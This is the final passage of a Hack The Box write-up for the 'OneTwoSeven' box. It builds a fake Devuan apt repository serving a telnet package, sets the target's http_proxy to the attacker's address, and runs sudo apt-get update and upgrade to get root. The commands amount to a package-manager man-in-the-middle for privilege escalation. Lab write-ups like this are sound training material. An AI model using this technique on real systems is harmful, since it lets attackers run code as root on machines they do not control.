root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# sha256sum telnet_0.17-42_amd64.deb 
77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd  telnet_0.17-42_amd64.deb
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
```
<br> `Packages` :
```
Package: telnet
Version: 0.17-42
Installed-Size: 157
Maintainer: Mats Erik Andersson <mats.andersson@gisladisker.se>
Architecture: amd64
Replaces: netstd
Provides: telnet-client
Depends: netbase, libc6 (>= 2.15), libstdc++6 (>= 5)
Description: basic telnet client
Description-md5: 80f238fa65c82c04a1590f2a062f47bb
Source: netkit-telnet
Tag: admin::login, interface::shell, network::client, protocol::ipv6,
 protocol::telnet, role::program, uitoolkit::ncurses, use::login
Section: net
Priority: standard
Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
Size: 72176
MD5sum: 2d29b3d5179226f9a772e370c1df05d9
SHA256: 77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd
```
<br> Path for the `Packages` file will be `dists/ascii/main/binary-amd64`, we know it's `ascii/main` from the sources list :
```
www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
```
<br> And `binary-amd64` because the package's architecture is `amd-64`
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir dists && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists# mkdir ascii && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii# mkdir main && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main# mkdir binary-amd64 && cd $_
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# cp ../../../../../Packages .
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# 
```
<br> And that's it for the repository.
```
root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# tree
.
├── dists
│   └── ascii
│       └── main
│           └── binary-amd64
│               └── Packages
└── pool
    └── DEBIAN
        └── main
            └── n
                └── netkit-telnet
                    └── telnet_0.17-42_amd64.deb

9 directories, 2 files
```
<br> What's left is to run a python `http` server in `~/Desktop/HTB/boxes/onetwoseven/apt-mitm/` and everything is done.
<br> I exported the `http_proxy` variable and I ran `apt-get update`:
```
www-admin-data@onetwoseven:/$ export http_proxy=http://10.10.xx.xx:8181/
www-admin-data@onetwoseven:/$ sudo apt-get update
```
<br> Then I ran `apt-get upgrade` :
![](/images/hackthebox/onetwoseven/33.png)
<br>
<br>
![](/images/hackthebox/onetwoseven/34.png)
<br> And we owned root !
<br> That's it , Feedback is appreciated !
<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : [Hack The Box - Unattended](/hack-the-box/unattended/)
<hr>